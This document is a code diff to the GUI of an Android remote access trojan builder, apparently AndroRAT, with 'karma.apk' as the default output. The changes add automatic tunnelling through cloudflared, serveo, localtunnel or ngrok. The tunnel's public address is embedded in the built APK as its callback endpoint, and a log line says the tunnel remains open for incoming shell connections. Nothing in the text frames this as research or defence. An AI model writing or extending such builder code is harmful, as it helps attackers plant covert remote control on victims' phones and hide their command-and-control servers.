@@ -38,6 +38,8 @@ class AndroRATGUI:
         self.output_var = tk.StringVar(value="karma.apk")
         self.icon_var = tk.BooleanVar()
         self.ngrok_var = tk.BooleanVar()
+        self.tunnel_var = tk.BooleanVar()
+        self.tunnel_service_var = tk.StringVar(value="auto")
         
         # Create notebook for tabs
         self.notebook = ttk.Notebook(root)
@@ -82,9 +84,40 @@ class AndroRATGUI:
         conn_frame = ttk.LabelFrame(config_frame, text="Connection Settings", padding=5)
         conn_frame.pack(fill=tk.X, pady=5)
         
-        # Ngrok checkbox
-        ttk.Checkbutton(conn_frame, text="Use Ngrok tunnel (automatically sets IP)", 
-                       variable=self.ngrok_var, command=self.on_ngrok_toggle).pack(anchor=tk.W)
+        # Tunneling options
+        tunnel_frame = ttk.LabelFrame(conn_frame, text="Tunneling Options", padding=5)
+        tunnel_frame.pack(fill=tk.X, pady=5)
+        
+        # Auto tunnel checkbox
+        ttk.Checkbutton(tunnel_frame, text="Auto-select best tunneling service", 
+                       variable=self.tunnel_var, command=self.on_tunnel_toggle).pack(anchor=tk.W)
+        
+        # Tunneling service selection
+        service_frame = ttk.Frame(tunnel_frame)
+        service_frame.pack(fill=tk.X, pady=5)
+        
+        ttk.Label(service_frame, text="Preferred Service:").pack(side=tk.LEFT)
+        self.service_combo = ttk.Combobox(service_frame, textvariable=self.tunnel_service_var,
+                                         values=["auto", "cloudflared", "serveo", "localtunnel", "ngrok"],
+                                         state="readonly", width=15)
+        self.service_combo.pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Info label for tunneling
+        self.tunnel_info = ttk.Label(tunnel_frame, 
+                                    text="✓ Recommended: Avoids ngrok credit card requirement",
+                                    foreground="green", font=('TkDefaultFont', 9))
+        self.tunnel_info.pack(anchor=tk.W, pady=2)
+        
+        # Legacy ngrok checkbox (with warning)
+        ngrok_frame = ttk.Frame(tunnel_frame)
+        ngrok_frame.pack(fill=tk.X, pady=2)
+        
+        ttk.Checkbutton(ngrok_frame, text="Use legacy ngrok (requires credit card for TCP)", 
+                       variable=self.ngrok_var, command=self.on_ngrok_toggle).pack(side=tk.LEFT)
+        
+        self.ngrok_warning = ttk.Label(ngrok_frame, text="⚠ May require credit card", 
+                                      foreground="orange", font=('TkDefaultFont', 8))
+        self.ngrok_warning.pack(side=tk.LEFT, padx=(5, 0))
         
         # IP and Port
         ip_frame = ttk.Frame(conn_frame)
@@ -212,9 +245,25 @@ class AndroRATGUI:
         if self.ngrok_var.get():
             self.ip_entry.config(state='disabled')
             self.ip_var.set("(auto-configured by ngrok)")
+            # Disable tunneling if ngrok is selected
+            self.tunnel_var.set(False)
+            self.on_tunnel_toggle()
         else:
             self.ip_entry.config(state='normal')
             self.ip_var.set("")
+            
+    def on_tunnel_toggle(self):
+        """Handle auto-tunnel checkbox toggle"""
+        if self.tunnel_var.get():
+            self.ip_entry.config(state='disabled')
+            self.ip_var.set("(auto-configured by tunnel)")
+            # Disable ngrok if tunneling is selected
+            self.ngrok_var.set(False)
+            self.on_ngrok_toggle()
+        else:
+            if not self.ngrok_var.get():
+                self.ip_entry.config(state='normal')
+                self.ip_var.set("")
             
     def browse_output_file(self):
         """Browse for output APK file location"""
@@ -260,9 +309,12 @@ class AndroRATGUI:
                 
     def validate_build_inputs(self):
         """Validate inputs for APK building"""
-        if not self.ngrok_var.get():
-            if not self.ip_var.get():
-                messagebox.showerror("Error", "IP address is required when not using ngrok")
+        # Check if either tunneling or manual IP is specified
+        using_tunnel = self.ngrok_var.get() or self.tunnel_var.get()
+        
+        if not using_tunnel:
+            if not self.ip_var.get() or self.ip_var.get().startswith("(auto-configured"):
+                messagebox.showerror("Error", "IP address is required when not using tunneling")
                 return False
             if not is_valid_ip(self.ip_var.get()):
                 messagebox.showerror("Error", "Invalid IP address format")
@@ -273,12 +325,25 @@ class AndroRATGUI:
             return False
             
         if not is_valid_port(self.port_var.get()):
-            messagebox.showerror("Error", "Invalid port number")
+            messagebox.showerror("Error", "Invalid port number (1-65535)")
             return False
             
         if not self.output_var.get():
             messagebox.showerror("Error", "Output filename is required")
             return False
+            
+        # Validate filename
+        if not is_valid_filename(self.output_var.get()):
+            # Auto-add .apk extension if missing
+            filename = self.output_var.get()
+            if not filename.lower().endswith('.apk'):
+                filename += '.apk'
+                self.output_var.set(filename)
+            
+            # Re-validate
+            if not is_valid_filename(filename):
+                messagebox.showerror("Error", "Invalid filename format")
+                return False
             
         return True
         
@@ -302,39 +367,65 @@ class AndroRATGUI:
             self.message_queue.put(("log", "Starting APK build process..."))
             
             # Prepare arguments
-            ip = self.ip_var.get() if not self.ngrok_var.get() else None
-            port = self.port_var.get()
+            ip = self.ip_var.get() if not (self.ngrok_var.get() or self.tunnel_var.get()) else None
+            port = int(self.port_var.get())
             output = self.output_var.get()
             icon = self.icon_var.get()
-            use_ngrok = self.ngrok_var.get()
+            use_tunneling = self.ngrok_var.get() or self.tunnel_var.get()
             
-            # Build the APK using the same logic as CLI
-            if use_ngrok:
-                self.message_queue.put(("log", "Setting up ngrok tunnel..."))
+            tunnel_manager = None
+            final_ip = ip
+            final_port = port
+            
+            # Handle tunneling
+            if use_tunneling:
+                self.message_queue.put(("log", "Setting up tunnel..."))
+                
                 try:
-                    from pyngrok import ngrok, conf
-                    conf.get_default().monitor_thread = False
-                    tcp_tunnel = ngrok.connect(port, "tcp")
-                    domain, ngrok_port = tcp_tunnel.public_url[6:].split(":")
-                    import socket
-                    ip = socket.gethostbyname(domain)
-                    port = ngrok_port
-                    self.message_queue.put(("log", f"Ngrok tunnel established: {ip}:{port}"))
+                    # Import tunneling module
+                    from tunneling import create_tunnel_with_alternatives
+                    
+                    # Determine service preference
+                    if self.ngrok_var.get():
+                        service = "ngrok"
+                    else:
+                        service = self.tunnel_service_var.get()
+                    
+                    self.message_queue.put(("log", f"Trying {service} tunneling service..."))
+                    
+                    # Create tunnel
+                    tunnel_manager, tunnel_result = create_tunnel_with_alternatives(port, service)
+                    
+                    if tunnel_result:
+                        final_ip, final_port, tunnel_url = tunnel_result
+                        self.message_queue.put(("log", f"Tunnel established: {final_ip}:{final_port}"))
+                        self.message_queue.put(("log", f"Tunnel URL: {tunnel_url}"))
+                    else:
+                        self.message_queue.put(("error", "Failed to establish tunnel"))
+                        return
+                        
                 except Exception as e:
-                    self.message_queue.put(("error", f"Ngrok setup failed: {str(e)}"))
+                    self.message_queue.put(("error", f"Tunnel setup failed: {str(e)}"))
                     return
                     
-            self.message_queue.put(("log", f"Building APK with IP: {ip}, Port: {port}"))
+            self.message_queue.put(("log", f"Building APK with IP: {final_ip}, Port: {final_port}"))
             
-            # Call build function
-            build(ip, port, output, use_ngrok, port if use_ngrok else None, icon)
+            # Call build function from utils
+            build(final_ip, str(final_port), output, use_tunneling, str(port) if use_tunneling else None, icon)
             
             self.message_queue.put(("success", f"APK built successfully: {output}"))
             
+            # If tunneling was used, optionally keep tunnel alive
+            if tunnel_manager:
+                self.message_queue.put(("log", "Tunnel will remain active for shell connections"))
+                
         except Exception as e:
             self.message_queue.put(("error", f"Build failed: {str(e)}"))
         finally:
             self.message_queue.put(("build_done", None))
+            if tunnel_manager:
+                # Close tunnel after build
+                tunnel_manager.close_tunnel()
             
     def start_shell(self):
         """Start shell listener"""
